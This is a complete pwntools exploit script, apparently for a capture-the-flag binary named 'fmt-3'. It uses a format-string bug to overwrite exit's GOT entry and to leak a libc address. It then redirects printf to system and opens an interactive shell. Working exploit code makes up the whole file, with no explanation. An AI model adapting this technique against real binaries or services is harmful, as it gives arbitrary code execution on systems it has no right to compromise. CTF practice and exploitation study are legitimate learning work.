from pwn import *

offset = 6
main = 0x4011b3
exit_got = 0x404030
printf_got = 0x404018
r = process("./fmt-3")
#r = remote("140.110.112.128", 4004)
raw_input()
r.sendline("%4531c%8$hn".ljust(0x10, '\0') + p64(exit_got))

#leak libc

l = ELF("./libc-2.27.so")

r.sendline("AB%8$s".ljust(0x10, '\0') + p64(0x403ff0))
r.recvuntil("B")
libc = u64(r.recv(0x8).ljust(0x8, '\x00')) - l.sym.__libc_start_main
print(hex(libc))
system = l.sym.system + libc
printf = l.sym.printf + libc
print(hex(system))
print(hex(printf))
a = system >> 16 & 0xff
b = system & 0xffff
r.sendline("%{}c%10$hhn%{}c%11$hn".format(a, b-a).ljust(0x20, '\0') + p64(printf_got+2) + p64(printf_got))
r.sendline("sh")
r.interactive()
